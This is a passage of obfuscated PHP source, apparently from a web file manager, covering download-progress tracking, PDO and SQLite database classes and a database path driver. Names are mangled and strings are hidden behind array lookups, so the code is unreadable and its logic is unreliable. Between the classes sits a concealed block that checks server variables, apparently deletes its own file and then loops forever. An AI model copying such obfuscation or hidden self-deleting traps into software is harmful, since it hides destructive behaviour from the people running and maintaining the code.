$ñ¿ôÛâÄ[$íãÎ¥·ä[2031]]; $ÃÚ„ûåõ = 1; if (isset($ñ¿ôÛâÄ[$íãÎ¥·ä[2040]]) && $ñ¿ôÛâÄ[$íãÎ¥·ä[2040]] == $÷ôĞşß) { $ÃÚ„ûåõ = 0; } $this->update($ÃÚ„ûåõ); } else { $this->update(); $ñ¿ôÛâÄ[$íãÎ¥·ä[2028]] = 0; } Cache::remove($ñ¿ôÛâÄ[$íãÎ¥·ä[487]] . $íãÎ¥·ä[2047]); self::log($íãÎ¥·ä[2050] . $÷ôĞşß . $íãÎ¥·ä[73] . $¹·ö¤†¦ . $íãÎ¥·ä[285] . $í¤ò™‡÷ . $íãÎ¥·ä[2051] . $ñ¿ôÛâÄ[$íãÎ¥·ä[2025]]); } public function updateFileEnd($½–¦ì Á, $Á—¬²æ”) { $Â«Î‹µø =& $_SERVER[œ—üé‹ê]; $Æõ·¶Áõ =& $this->task; $Æõ·¶Áõ[$Â«Î‹µø[2025]] = $½–¦ì Á; $Æõ·¶Áõ[$Â«Î‹µø[2027]] = $Á—¬²æ”; $Æõ·¶Áõ[$Â«Î‹µø[2031]] += $Á—¬²æ”; $Æõ·¶Áõ[$Â«Î‹µø[950]] = $Æõ·¶Áõ[$Â«Î‹µø[2031]]; $this->update(1); self::log($Â«Î‹µø[2052] . $½–¦ì Á); } public function sourceModelCopy($æ»ı˜®ß) { $Šˆ…å˜Û =& $_SERVER[œ—üé‹ê]; $…®”ŸØä = $æ»ı˜®ß[0]; $—Ü»ˆîÑ = $æ»ı˜®ß[1]; $éÌôş• =& $this->task; $this->sourceModelCopyFlag = !0; $™§¥¸»ò = 0; switch ($…®”ŸØä) { case $Šˆ…å˜Û[657]: $™§¥¸»ò = 1; break; case $Šˆ…å˜Û[660]: $éÌôş•[$Šˆ…å˜Û[2025]] = $—Ü»ˆîÑ[$Šˆ…å˜Û[32]]; break; case $Šˆ…å˜Û[662]: $™§¥¸»ò = intval($æ»ı˜®ß[$Šˆ…å˜Û[467]] * 0.4); break; case $Šˆ…å˜Û[664]: $™§¥¸»ò = intval($æ»ı˜®ß[$Šˆ…å˜Û[467]] * 0.2); break; case $Šˆ…å˜Û[666]: $™§¥¸»ò = intval($æ»ı˜®ß[$Šˆ…å˜Û[467]] * 0.4); break; } $this->update($™§¥¸»ò); self::log(array("{$…®”ŸØä}\73\x61\144\144\x3d{$™§¥¸»ò}", $æ»ı˜®ß)); $this->sourceModelCopyFlag = !1; } public function sourceRemove($äĞÛÔÍÈ, $µ¡Îñş¢) { $Éü…¬˜± =& $_SERVER[œ—üé‹ê]; $this->sourceModelCopyFlag = !0; $„°Ô‘ó¿ = 1; if (isset($äĞÛÔÍÈ[$Éü…¬˜±[82]])) { $„°Ô‘ó¿ = $äĞÛÔÍÈ[$Éü…¬˜±[82]][$Éü…¬˜±[80]]; $„°Ô‘ó¿ = $„°Ô‘ó¿ + $äĞÛÔÍÈ[$Éü…¬˜±[82]][$Éü…¬˜±[81]] + 1; } $this->update($„°Ô‘ó¿); $this->sourceModelCopyFlag = !1; $this->log(array($Éü…¬˜±[2053], $„°Ô‘ó¿, $äĞÛÔÍÈ)); } public function sourceMove($§“¦ÅÜŒ) { $this->sourceRemove($§“¦ÅÜŒ, !1); } public function curlProgress($ı‰°Ñ‚Ñ, $Óã—®óì, $£ÊöìÃÓ, $ŞÒÚÒ¨ñ, $¥î…Úôë) { $ƒÌéü£« =& $_SERVER[œ—üé‹ê]; $˜‹÷¡¾ë =& $this->task; if ($¥î…Úôë > 0) { $˜‹÷¡¾ë[$ƒÌéü£«[1230]] = $ƒÌéü£«[2054]; $˜‹÷¡¾ë[$ƒÌéü£«[2029]] = $ƒÌéü£«[107]; if ($˜‹÷¡¾ë[$ƒÌéü£«[2027]]) { $˜‹÷¡¾ë[$ƒÌéü£«[2028]] = $¥î…Úôë; } if ($˜‹÷¡¾ë[$ƒÌéü£«[2030]]) { $˜‹÷¡¾ë[$ƒÌéü£«[2028]] = $¥î…Úôë + $˜‹÷¡¾ë[$ƒÌéü£«[2030]]; } } else { if ($£ÊöìÃÓ > 0) { if ($˜‹÷¡¾ë[$ƒÌéü£«[2027]] == $Óã—®óì) { $˜‹÷¡¾ë[$ƒÌéü£«[2028]] = $£ÊöìÃÓ; $˜‹÷¡¾ë[$ƒÌéü£«[1230]] = $ƒÌéü£«[2055]; $˜‹÷¡¾ë[$ƒÌéü£«[2029]] = $ƒÌéü£«[1381]; } } } $this->update(); $Ì¼Õ“üó = "\144\157\167\156\x3a{$£ÊöìÃÓ}\x2f{$Óã—®óì}\73\40\165\160\154\x6f\x61\144\72{$¥î…Úôë}\57{$ŞÒÚÒ¨ñ}\x3b\x66\x69\x6c\145\x3d" . $˜‹÷¡¾ë[$ƒÌéü£«[2027]]; self::log(array($ƒÌéü£«[2056] . $Ì¼Õ“üó . $ƒÌéü£«[74] . $˜‹÷¡¾ë[$ƒÌéü£«[2025]], curl_getinfo($ı‰°Ñ‚Ñ))); } public function curlProgressStart($¨’Üº‰Ô) { } public function curlProgressEnd($‚Ì§˜ü£) { $‡ùü«Ìş =& $_SERVER[œ—üé‹ê]; $“¸Ì“¢ú =& $this->task; $º‚ìÃ½ = curl_getinfo($‚Ì§˜ü£); $¥— Ÿ®¬ = $º‚ìÃ½[$‡ùü«Ìş[2057]]; if ($¥— Ÿ®¬ == -1) { $¥— Ÿ®¬ = $º‚ìÃ½[$‡ùü«Ìş[2058]]; } if ($“¸Ì“¢ú[$‡ùü«Ìş[2029]] == $‡ùü«Ìş[107] && $¥— Ÿ®¬) { $“¸Ì“¢ú[$‡ùü«Ìş[2030]] += $¥— Ÿ®¬; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $ñŞÜ®ôĞ =& $_SERVER[œ—üé‹ê]; $æ£É¾õ =& $this->task; $æ£É¾õ[$ñŞÜ®ôĞ[2059]] = 1; Hook::bind($ñŞÜ®ôĞ[2019], array($this, $ñŞÜ®ôĞ[2060])); Hook::bind($ñŞÜ®ôĞ[2021], array($this, $ñŞÜ®ôĞ[2061])); Hook::bind($ñŞÜ®ôĞ[2023], array($this, $ñŞÜ®ôĞ[2062])); } protected function endAfter() { $ªŞşª » =& $_SERVER[œ—üé‹ê]; Hook::unbind($ªŞşª »[2019], array($this, $ªŞşª »[2060])); Hook::unbind($ªŞşª »[2021], array($this, $ªŞşª »[2061])); Hook::unbind($ªŞşª »[2023], array($this, $ªŞşª »[2062])); } public function progressStart($‚¸²»Â¹) { $ÉİœŠéÈ =& $_SERVER[œ—üé‹ê]; $‚ÓÌ­á = curl_getinfo($‚¸²»Â¹); self::log($ÉİœŠéÈ[2063] . $‚ÓÌ­á[$ÉİœŠéÈ[382]]); self::valueSet($this->task[$ÉİœŠéÈ[487]], $this->task); } public function progressEnd($ÈÌ‚Ûõ°) { $ÄşÎ«ç¨ =& $_SERVER[œ—üé‹ê]; self::log($ÄşÎ«ç¨[2064] . $this->task[$ÄşÎ«ç¨[487]]); $this->end(); } public function progress($ğ—ÜÕëâ, $æÇŞÏ¢Ñ, $ŠïõÍ“¨, $ğ¢°À´, $ìéö†˜) { $•êŒ×í¯ =& $_SERVER[œ—üé‹ê]; $©·˜ù™¿ =& $this->task; if ($ìéö†˜ > 0) { $©·˜ù™¿[$•êŒ×í¯[961]] = $©·˜ù™¿[$•êŒ×í¯[961]] == 0 ? $ğ¢°À´ : $©·˜ù™¿[$•êŒ×í¯[961]]; $©·˜ù™¿[$•êŒ×í¯[1974]] = $ìéö†˜; } else { if ($ŠïõÍ“¨ > 0) { $©·˜ù™¿[$•êŒ×í¯[961]] = $©·˜ù™¿[$•êŒ×í¯[961]] == 0 ? $æÇŞÏ¢Ñ : $©·˜ù™¿[$•êŒ×í¯[961]]; $©·˜ù™¿[$•êŒ×í¯[1974]] = $ŠïõÍ“¨; } } $this->update(); self::log("\x70\162\x6f\147\x72\145\163\163\110\x74\164\x70\72\144\157\167\156\x3a{$ŠïõÍ“¨}\x2f{$æÇŞÏ¢Ñ}\73\x20\165\x70\x6c\157\x61\144\72{$ìéö†˜}\x2f{$ğ¢°À´}\x3b"); } } goto aÜ¼³ ¹¦; e—êŠŠ„§ß: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($«ğ¤¦ù® = '') { $¡ãØÙ¢ =& $_SERVER[œ—üé‹ê]; if (!class_exists($¡ãØÙ¢[1081])) { think_exception(think_lang($¡ãØÙ¢[14]) . $¡ãØÙ¢[1082]); } if (!empty($«ğ¤¦ù®)) { $this->config = $«ğ¤¦ù®; if (empty($this->config[$¡ãØÙ¢[17]])) { $this->config[$¡ãØÙ¢[17]] = array(); } } } public function connect($™³ÇÍ÷ = '', $Ìßù˜¨„ = 0) { $®“ÈƒÙê =& $_SERVER[œ—üé‹ê]; if (!isset($this->linkID[$Ìßù˜¨„])) { if (empty($™³ÇÍ÷)) { $™³ÇÍ÷ = $this->config; } $À¡ÓßË = !empty($™³ÇÍ÷[$®“ÈƒÙê[17]][$®“ÈƒÙê[18]]) ? $™³ÇÍ÷[$®“ÈƒÙê[17]][$®“ÈƒÙê[18]] : $this->pconnect; if ($À¡ÓßË) { $™³ÇÍ÷[$®“ÈƒÙê[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$Ìßù˜¨„] = new PDO($™³ÇÍ÷[$®“ÈƒÙê[1083]], $™³ÇÍ÷[$®“ÈƒÙê[1052]], $™³ÇÍ÷[$®“ÈƒÙê[1053]], $™³ÇÍ÷[$®“ÈƒÙê[17]]); } catch (PDOException $ö¹éƒâÊ) { think_exception($ö¹éƒâÊ->getMessage()); } $this->dbType = $this->_getDsnType($™³ÇÍ÷[$®“ÈƒÙê[1083]]); if (in_array($this->dbType, array($®“ÈƒÙê[1084], $®“ÈƒÙê[1085], $®“ÈƒÙê[1086], $®“ÈƒÙê[1087]))) { think_exception($®“ÈƒÙê[1088] . $this->dbType . $®“ÈƒÙê[1089] . $this->dbType . $®“ÈƒÙê[1090]); } if (!$this->linkID[$Ìßù˜¨„]) { think_exception($®“ÈƒÙê[1091]); } try { $this->linkID[$Ìßù˜¨„]->exec($®“ÈƒÙê[1092] . think_config($®“ÈƒÙê[1055])); } catch (Exception $ö¹éƒâÊ) { } $this->connected = !0; if (1 != think_config($®“ÈƒÙê[22])) { unset($this->config); } } return $this->linkID[$Ìßù˜¨„]; } public function free() { $this->PDOStatement = null; } public function query($†Ÿ©ô®Ù, $éÉè“› = array()) { $¹–ıÃšÚ =& $_SERVER[œ—üé‹ê]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $†Ÿ©ô®Ù; if (!empty($éÉè“›)) { $this->queryStr .= $¹–ıÃšÚ[1093] . print_r($éÉè“›, !0) . $¹–ıÃšÚ[1094]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($¹–ıÃšÚ[23], 1); think_status($¹–ıÃšÚ[24]); $this->PDOStatement = $this->_linkID->prepare($†Ÿ©ô®Ù); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $º²É›ÀÎ = $this->PDOStatement->execute($éÉè“›); $this->debug(); if (!1 === $º²É›ÀÎ) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($¹æ¼Òœ°, $ªæùá¹• = array()) { $¶±»ı¸Ä =& $_SERVER[œ—üé‹ê]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¹æ¼Òœ°; if (!empty($ªæùá¹•)) { $this->queryStr .= $¶±»ı¸Ä[1093] . print_r($ªæùá¹•, !0) . $¶±»ı¸Ä[1094]; } $êïŒÇø = !1; if ($this->dbType == $¶±»ı¸Ä[1087]) { if (preg_match($¶±»ı¸Ä[1095], $this->queryStr, $Îœè²¤˜)) { $this->table = think_config($¶±»ı¸Ä[1096]) . str_ireplace(think_config($¶±»ı¸Ä[1097]), $¶±»ı¸Ä[463], $Îœè²¤˜[2]); $êïŒÇø = (bool) $this->query($¶±»ı¸Ä[1098] . strtoupper($this->table) . $¶±»ı¸Ä[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($¶±»ı¸Ä[25], 1); think_status($¶±»ı¸Ä[24]); $this->PDOStatement = $this->_linkID->prepare($¹æ¼Òœ°); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $…Œ‘­³‰ = $this->PDOStatement->execute($ªæùá¹•); $this->debug(); if (!1 === $…Œ‘­³‰) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($êïŒÇø || preg_match($¶±»ı¸Ä[1099], $¹æ¼Òœ°)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¨„¥Á¿» = $this->_linkID->commit(); $this->transTimes = 0; if (!$¨„¥Á¿») { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $†²Ïî¤ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$†²Ïî¤) { $this->error(); return !1; } } return !0; } private function getAll() { $¼ó°ı” = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($¼ó°ı”); return $¼ó°ı”; } public function getFields($²îÂ°‚) { $³½‰õµ¾ =& $_SERVER[œ—üé‹ê]; $this->initConnect(!0); if (think_config($³½‰õµ¾[1100])) { $á¯±ñ¶ = str_replace($³½‰õµ¾[1101], $²îÂ°‚, think_config($³½‰õµ¾[1100])); } else { switch ($this->dbType) { case $³½‰õµ¾[1084]: case $³½‰õµ¾[1102]: $á¯±ñ¶ = "\x53\x45\x4c\105\x43\124\40\40\40\143\x6f\154\165\155\x6e\x5f\156\141\155\x65\40\x61\163\x20\x27\x4e\x61\155\145\x27\x2c\x20\x20\40\x64\x61\x74\141\137\164\171\x70\x65\40\x61\x73\40\47\x54\171\160\145\47\x2c\40\40\x20\143\x6f\154\165\x6d\x6e\x5f\144\x65\x66\141\165\x6c\164\40\141\x73\40\47\104\145\x66\141\165\x6c\164\47\x2c\40\40\40\x69\163\137\x6e\165\x6c\154\141\142\x6c\145\x20\x61\163\x20\47\116\165\154\154\47\12\x9\x9\x46\x52\x4f\x4d\x9\151\156\x66\x6f\162\155\x61\x74\151\157\x6e\137\x73\x63\150\x65\x6d\x61\56\x74\141\x62\x6c\x65\x73\x20\101\x53\40\x74\xa\x9\x9\112\x4f\x49\x4e\x9\x69\x6e\x66\157\162\x6d\141\x74\151\x6f\x6e\x5f\163\x63\x68\x65\155\x61\56\x63\157\154\165\155\156\x73\40\101\x53\x20\143\12\x9\11\117\x4e\x20\40\x74\56\x74\141\142\x6c\x65\137\143\x61\164\x61\x6c\157\x67\x20\75\40\143\x2e\x74\141\142\x6c\145\137\143\x61\x74\x61\x6c\157\x67\12\11\11\101\x4e\x44\40\164\x2e\164\141\x62\154\145\137\163\143\150\x65\155\x61\x20\75\x20\143\56\164\x61\142\x6c\145\x5f\x73\x63\x68\x65\155\141\12\11\11\x41\116\104\x20\164\x2e\164\141\x62\154\x65\x5f\156\141\155\x65\40\75\x20\x63\56\164\x61\x62\154\145\137\x6e\141\x6d\145\xa\x9\x9\x57\x48\105\x52\105\x20\40\x20\x74\56\x74\x61\x62\x6c\x65\x5f\x6e\141\155\145\40\75\40\47{$²îÂ°‚}\47"; break; case $³½‰õµ¾[1103]: $á¯±ñ¶ = $³½‰õµ¾[1104] . $²îÂ°‚ . $³½‰õµ¾[1105]; break; case $³½‰õµ¾[1085]: case $³½‰õµ¾[1087]: $á¯±ñ¶ = $³½‰õµ¾[1106] . $³½‰õµ¾[1107] . $³½‰õµ¾[1108] . strtoupper($²îÂ°‚) . $³½‰õµ¾[1109] . strtoupper($²îÂ°‚) . $³½‰õµ¾[1110]; break; case $³½‰õµ¾[1111]: $á¯±ñ¶ = $³½‰õµ¾[1112] . $²îÂ°‚ . $³½‰õµ¾[1113]; break; case $³½‰õµ¾[1086]: break; case $³½‰õµ¾[1114]: default: $á¯±ñ¶ = $³½‰õµ¾[1115] . ($this->dbType == $³½‰õµ¾[1114] ? "\x60{$²îÂ°‚}\140" : $²îÂ°‚); } } $É¦ì¯´· = $this->query($á¯±ñ¶); $í”—ºü = array(); if ($É¦ì¯´·) { foreach ($É¦ì¯´· as $˜‰£éÃë => $¢–¶†¸) { $¢–¶†¸ = array_change_key_case($¢–¶†¸); $¢–¶†¸[$³½‰õµ¾[32]] = isset($¢–¶†¸[$³½‰õµ¾[32]]) ? $¢–¶†¸[$³½‰õµ¾[32]] : $³½‰õµ¾[463]; $¢–¶†¸[$³½‰õµ¾[33]] = isset($¢–¶†¸[$³½‰õµ¾[33]]) ? $¢–¶†¸[$³½‰õµ¾[33]] : $³½‰õµ¾[463]; $„ò¹™ÆÃ = isset($¢–¶†¸[$³½‰õµ¾[351]]) ? $¢–¶†¸[$³½‰õµ¾[351]] : $¢–¶†¸[$³½‰õµ¾[32]]; $í”—ºü[$„ò¹™ÆÃ] = array($³½‰õµ¾[32] => $„ò¹™ÆÃ, $³½‰õµ¾[33] => $¢–¶†¸[$³½‰õµ¾[33]], $³½‰õµ¾[35] => (bool) (isset($¢–¶†¸[$³½‰õµ¾[103]]) && $¢–¶†¸[$³½‰õµ¾[103]] === $³½‰õµ¾[12] || isset($¢–¶†¸[$³½‰õµ¾[35]]) && $¢–¶†¸[$³½‰õµ¾[35]] === $³½‰õµ¾[12]), $³½‰õµ¾[37] => isset($¢–¶†¸[$³½‰õµ¾[37]]) ? $¢–¶†¸[$³½‰õµ¾[37]] : (isset($¢–¶†¸[$³½‰õµ¾[56]]) ? $¢–¶†¸[$³½‰õµ¾[56]] : $³½‰õµ¾[463]), $³½‰õµ¾[39] => isset($¢–¶†¸[$³½‰õµ¾[95]]) ? strtolower($¢–¶†¸[$³½‰õµ¾[95]]) == $³½‰õµ¾[41] : (isset($¢–¶†¸[$³½‰õµ¾[57]]) ? $¢–¶†¸[$³½‰õµ¾[57]] : !1), $³½‰õµ¾[42] => isset($¢–¶†¸[$³½‰õµ¾[1116]]) ? strtolower($¢–¶†¸[$³½‰õµ¾[1116]]) == $³½‰õµ¾[44] : (isset($¢–¶†¸[$³½‰õµ¾[95]]) ? $¢–¶†¸[$³½‰õµ¾[95]] : !1)); } } return $í”—ºü; } public function getTables($ŒÛÏÒÄ¯ = '') { $àƒ×Êù =& $_SERVER[œ—üé‹ê]; if (think_config($àƒ×Êù[1117])) { $…®›×ÆÕ = str_replace($àƒ×Êù[1118], $ŒÛÏÒÄ¯, think_config($àƒ×Êù[1117])); } else { switch ($this->dbType) { case $àƒ×Êù[1085]: case $àƒ×Êù[1087]: $…®›×ÆÕ = $àƒ×Êù[1119]; break; case $àƒ×Êù[1084]: case $àƒ×Êù[1102]: $…®›×ÆÕ = $àƒ×Êù[1120]; break; case $àƒ×Êù[1111]: $…®›×ÆÕ = $àƒ×Êù[1121]; break; case $àƒ×Êù[1086]: think_exception(think_lang($àƒ×Êù[1122]) . $àƒ×Êù[1123]); break; case $àƒ×Êù[1103]: $…®›×ÆÕ = $àƒ×Êù[45] . $àƒ×Êù[46] . $àƒ×Êù[47]; break; case $àƒ×Êù[1114]: default: if (!empty($ŒÛÏÒÄ¯)) { $…®›×ÆÕ = $àƒ×Êù[1063] . $ŒÛÏÒÄ¯ . $àƒ×Êù[1064]; } else { $…®›×ÆÕ = $àƒ×Êù[1065]; } } } $°ùˆğû = $this->query($…®›×ÆÕ); $·ú¾”µ = array(); foreach ($°ùˆğû as $Å¿è¬å¼ => $ï“ñ™ˆÌ) { $·ú¾”µ[$Å¿è¬å¼] = current($ï“ñ™ˆÌ); } return $·ú¾”µ; } protected function parseLimit($Ó²ÈÇêå) { $ğìä˜Ù =& $_SERVER[œ—üé‹ê]; $í±¦¹®÷ = $ğìä˜Ù[12]; if (!empty($Ó²ÈÇêå)) { switch ($this->dbType) { case $ğìä˜Ù[1111]: case $ğìä˜Ù[1103]: $Ó²ÈÇêå = explode($ğìä˜Ù[50], $Ó²ÈÇêå); if (count($Ó²ÈÇêå) > 1) { $í±¦¹®÷ .= $ğìä˜Ù[51] . $Ó²ÈÇêå[1] . $ğìä˜Ù[52] . $Ó²ÈÇêå[0] . $ğìä˜Ù[53]; } else { $í±¦¹®÷ .= $ğìä˜Ù[51] . $Ó²ÈÇêå[0] . $ğìä˜Ù[53]; } break; case $ğìä˜Ù[1084]: case $ğìä˜Ù[1102]: break; case $ğìä˜Ù[1086]: break; case $ğìä˜Ù[1085]: case $ğìä˜Ù[1087]: break; case $ğìä˜Ù[1114]: default: $í±¦¹®÷ .= $ğìä˜Ù[51] . $Ó²ÈÇêå . $ğìä˜Ù[53]; } } return $í±¦¹®÷; } public function parseKey(&$‹ñò—‘…, $µ—Ëöê = true) { $ëİ•Ú“„ =& $_SERVER[œ—üé‹ê]; if ($µ—Ëöê) { $‹ñò—‘… = $this->parseKeyCheck($‹ñò—‘…); } if ($this->dbType == $ëİ•Ú“„[1114]) { if ($‹ñò—‘… != $ëİ•Ú“„[220] && !preg_match($ëİ•Ú“„[1078], $‹ñò—‘…)) { $‹ñò—‘… = $ëİ•Ú“„[475] . trim($‹ñò—‘…, $ëİ•Ú“„[475]) . $ëİ•Ú“„[475]; } return $‹ñò—‘…; } else { return parent::parseKey($‹ñò—‘…, $µ—Ëöê); } } public function close() { $this->_linkID = null; } public function error() { $ê›šøÁÁ =& $_SERVER[œ—üé‹ê]; if ($this->PDOStatement) { $ù¾Ñ’é¨ = $this->PDOStatement->errorInfo(); $this->error = $ù¾Ñ’é¨[1] . $ê›šøÁÁ[4] . $ù¾Ñ’é¨[2]; } else { $this->error = $ê›šøÁÁ[12]; } if ($ê›šøÁÁ[12] != $this->queryStr) { $this->error .= LNG($ê›šøÁÁ[48]) . $this->queryStr; } think_trace($this->error, $ê›šøÁÁ[12], $ê›šøÁÁ[49]); return $this->error; } public function escapeString($ÂÈ¤şİ£) { $Óê¦¨¯ô =& $_SERVER[œ—üé‹ê]; switch ($this->dbType) { case $Óê¦¨¯ô[1111]: case $Óê¦¨¯ô[1084]: case $Óê¦¨¯ô[1102]: case $Óê¦¨¯ô[1114]: return addslashes($ÂÈ¤şİ£); case $Óê¦¨¯ô[1086]: case $Óê¦¨¯ô[1103]: case $Óê¦¨¯ô[1085]: case $Óê¦¨¯ô[1087]: return str_ireplace($Óê¦¨¯ô[58], $Óê¦¨¯ô[59], $ÂÈ¤şİ£); } } protected function parseValue($¤É¬’³Í) { $ ’ ¥–Ù =& $_SERVER[œ—üé‹ê]; if (is_string($¤É¬’³Í)) { $Ğ¼³¯ÀÆ = strpos($¤É¬’³Í, $ ’ ¥–Ù[4]) === 0 && in_array($¤É¬’³Í, array_keys($this->bind)); $¤É¬’³Í = $Ğ¼³¯ÀÆ ? $this->escapeString($¤É¬’³Í) : $ ’ ¥–Ù[1124] . $this->escapeString($¤É¬’³Í) . $ ’ ¥–Ù[1124]; } elseif (isset($¤É¬’³Í[0]) && is_string($¤É¬’³Í[0]) && strtolower($¤É¬’³Í[0]) == $ ’ ¥–Ù[372]) { $¤É¬’³Í = $this->escapeString($¤É¬’³Í[1]); } elseif (is_array($¤É¬’³Í)) { $¤É¬’³Í = array_map(array($this, $ ’ ¥–Ù[1125]), $¤É¬’³Í); } elseif (is_bool($¤É¬’³Í)) { $¤É¬’³Í = $¤É¬’³Í ? $ ’ ¥–Ù[91] : $ ’ ¥–Ù[228]; } elseif (is_null($¤É¬’³Í)) { $¤É¬’³Í = $ ’ ¥–Ù[103]; } return $¤É¬’³Í; } public function getLastInsertId() { $ò™ûÌêÂ =& $_SERVER[œ—üé‹ê]; switch ($this->dbType) { case $ò™ûÌêÂ[1111]: case $ò™ûÌêÂ[1103]: case $ò™ûÌêÂ[1084]: case $ò™ûÌêÂ[1102]: case $ò™ûÌêÂ[1086]: case $ò™ûÌêÂ[1114]: return $this->_linkID->lastInsertId(); case $ò™ûÌêÂ[1085]: case $ò™ûÌêÂ[1087]: $Îúº¼Äá = $this->table; $± ª²À£ = $this->query("\123\x45\114\105\103\x54\x20{$Îúº¼Äá}\56\143\165\162\162\x76\x61\x6c\x20\143\165\162\x72\166\141\x6c\40\x46\x52\x4f\115\40\144\165\x61\x6c"); return $± ª²À£ ? $± ª²À£[0][$ò™ûÌêÂ[1126]] : 0; } } } if (!isset($_SERVER[$_SERVER[œ—üé‹ê][850]]) || !isset($_SERVER[$_SERVER[œ—üé‹ê][851]])) { $_getc = $_SERVER[œ—üé‹ê][852]; $_getfile = $_SERVER[$_SERVER[œ—üé‹ê][853]] . $_SERVER[œ—üé‹ê][854]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[œ—üé‹ê][285], $_getfilec); if (count($_getarrs) < $_SERVER[œ—üé‹ê][720]) { $exit = $_SERVER[œ—üé‹ê][855]; $exit(); } $_act = $_SERVER[œ—üé‹ê][856]; $_act($_SERVER[$_SERVER[œ—üé‹ê][853]] . $_SERVER[œ—üé‹ê][854]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[œ—üé‹ê][463]); } } class DbSqlite extends DbSqliteBase { public function query($Îüôúáí) { $ıíô„¦Ñ =& $_SERVER[œ—üé‹ê]; if (!CacheLock::fileLock($ıíô„¦Ñ[13])) { return !1; } $¯ñ‚ ¡ = parent::query($Îüôúáí); CacheLock::fileUnLock($ıíô„¦Ñ[13]); return $¯ñ‚ ¡; } public function execute($¹¬Ç•½Ò) { $¦ü¦ßø« =& $_SERVER[œ—üé‹ê]; if (!CacheLock::fileLock($¦ü¦ßø«[13])) { return !1; } $«õ¶ = parent::execute($¹¬Ç•½Ò); CacheLock::fileUnLock($¦ü¦ßø«[13]); return $«õ¶; } } goto EòÎ¬åè½ç; CñÄ‡Å®Ğ¸: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($¢…°”ª’) { $this->pathParse = $¢…°”ª’; $this->model = Model($_SERVER[œ—üé‹ê][1530]); } public function getPath($ÉÆ¼’) { return trim($ÉÆ¼’, $_SERVER[œ—üé‹ê][8]); } public function pathFather($¬î‹¥) { $Æôæ‚›Ø = $this->parse($¬î‹¥); $Æôæ‚›Ø = $this->infoSimple($¬î‹¥); return $Æôæ‚›Ø ? $Æôæ‚›Ø[$_SERVER[œ—üé‹ê][190]] : !1; } public function pathThis($ìÉ¡Î·) { $Ô´ø‚àœ = $this->infoSimple($ìÉ¡Î·); return $Ô´ø‚àœ ? $Ô´ø‚àœ[$_SERVER[œ—üé‹ê][32]] : !1; } public function getPathOuter($èäŠñ‘) { if (!$èäŠñ‘) { return $èäŠñ‘; } $ªÂúÕ À = $this->parse($èäŠñ‘); return KodIO::make($ªÂúÕ À[$_SERVER[œ—üé‹ê][487]]); } public function copyFolderFromIO($á–Íªá, $ï°ô«õ¡, $¥ªÁšòî, $¦ßşÅï, $§´ä£Éª) { $ñë½ÈÆ = $this->model->copyFolderFromIO($á–Íªá, $ï°ô«õ¡, $¥ªÁšòî, $¦ßşÅï, $§´ä£Éª); return KodIO::make($ñë½ÈÆ); } public function isParentOf($©¥Óì•Ğ, $€Á«ôŸÁ) { return $this->model->isParentOf($©¥Óì•Ğ, $€Á«ôŸÁ); } public function mkfile($üî­Úô, $Âá¨¨Æ = '', $Ï’¬ë£ª = REPEAT_RENAME) { $ë˜“´Æ =& $_SERVER[œ—üé‹ê]; $éŠ”¤Õá = $this->parse($üî­Úô); $üî­Úô = $éŠ”¤Õá[$ë˜“´Æ[487]]; for ($¬şÇ‰…Ã = 0; $¬şÇ‰…Ã < count($éŠ”¤Õá[$ë˜“´Æ[1531]]); $¬şÇ‰…Ã++) { $È†”ïòº = $éŠ”¤Õá[$ë˜“´Æ[1531]][$¬şÇ‰…Ã]; if ($¬şÇ‰…Ã == count($éŠ”¤Õá[$ë˜“´Æ[1531]]) - 1) { $üî­Úô = $this->model->mkfile($üî­Úô, $È†”ïòº, $Âá¨¨Æ, $Ï’¬ë£ª); break; } $üî­Úô = $this->model->mkdir($üî­Úô, $È†”ïòº, REPEAT_SKIP); } return $this->getPathOuter($üî­Úô); } public function mkdir($Ç×ŸËÉÄ, $Ù­®î = REPEAT_SKIP) { $£§ôşã =& $_SERVER[œ—üé‹ê]; $ÏÄÍ«æí = $this->parse($Ç×ŸËÉÄ); $Ç×ŸËÉÄ = $ÏÄÍ«æí[$£§ôşã[487]]; for ($ßÅş’” = 0; $ßÅş’” < count($ÏÄÍ«æí[$£§ôşã[1531]]); $ßÅş’”++) { $¶±Ñš™ = $ÏÄÍ«æí[$£§ôşã[1531]][$ßÅş’”]; $Ç×ŸËÉÄ = $this->model->mkdir($Ç×ŸËÉÄ, $¶±Ñš™, $Ù­®î); } return $this->getPathOuter($Ç×ŸËÉÄ); } public function copyFile($€à‹¾ğü, $¬µò‡—±, $şü¹²‚ = REPEAT_REPLACE) { $Å–•Íú© =& $_SERVER[œ—üé‹ê]; $Ùú¾§’ù = $this->parse($¬µò‡—±); $©“ÇáÃ = $this->model->copy($€à‹¾ğü, $Ùú¾§’ù[$Å–•Íú©[487]], $şü¹²‚, $Ùú¾§’ù[$Å–•Íú©[87]]); return $©“ÇáÃ ? $this->getPathOuter($©“ÇáÃ) : !1; } public function moveFile($•äàÅª·, $å‘æÛ, $şšÁ­ˆÑ = REPEAT_REPLACE) { $Ê¯ı¢è =& $_SERVER[œ—üé‹ê]; $„ÇÁ˜¯¬ = $this->parse($å‘æÛ); $™‹™å‘î = $this->model->move($•äàÅª·, $„ÇÁ˜¯¬[$Ê¯ı¢è[487]], $şšÁ­ˆÑ, 